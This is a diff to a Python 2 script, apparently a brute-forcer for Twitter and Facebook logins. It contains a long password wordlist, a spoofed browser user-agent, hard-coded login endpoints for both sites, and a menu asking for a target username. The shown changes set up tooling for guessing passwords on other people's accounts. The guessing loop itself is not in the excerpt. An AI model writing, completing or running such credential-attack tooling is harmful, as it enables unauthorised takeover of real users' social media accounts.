@@ -7,10 +7,9 @@ import random
 import subprocess
 import mechanize
 import cookielib
+import webbrowser
 from colorama import *
 init()
-
-
 
 
 passlist = ['12345','abc123','password','computer','123456','tigger','1234','a1b2c3','qwerty','123','xxx','test','carmen','mickey',
@@ -62,6 +61,11 @@ passlist = ['12345','abc123','password','computer','123456','tigger','1234','a1b
 '0120b470id34','0120b47h9m3712ic','0120b4nch3','0120b4nch30u5','0120b4nch4c30u5','0120b4nch4c343','0120c1247ic','0120ch0n',
 '0120di46n05i5','0120h31i06124ph','0120h9d1206124ph9','0120h9d1206124phic','0120h9d1206124phic41','0120hippu5','0120id3']
 
+useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
+login = 'https://mobile.twitter.com/session'
+login2 = 'https://www.facebook.com/login.php?login_attempt=1'
+version = "0.0.1"
+
 subprocess.call('clear', shell=True)
 
 def main():
@@ -82,6 +86,7 @@ def main():
 	print("\t   \         /   ")
 	print("\t    `.     ,'    ")
 	print("\t      `-.-'      ")
+	print("\t             v" + version)
 	
         print "\nSelect a BruteForcer:"
         print
@@ -97,9 +102,11 @@ def main():
         print
 
         if choice == '1':
+        	
             username = raw_input("Enter Twitter username: ")
 
         if choice == '2':
+        
             username = raw_input("Enter Facebook username: ")
 
 
@@ -108,8 +115,9 @@ def main():
 
 
         if choice == '4':
-            print BANNER
-
+        	def test():
+        		webbrowser.open("http://www.google.com")
+    		test()
 
         if choice == "exit" or choice == '0':
             exit()
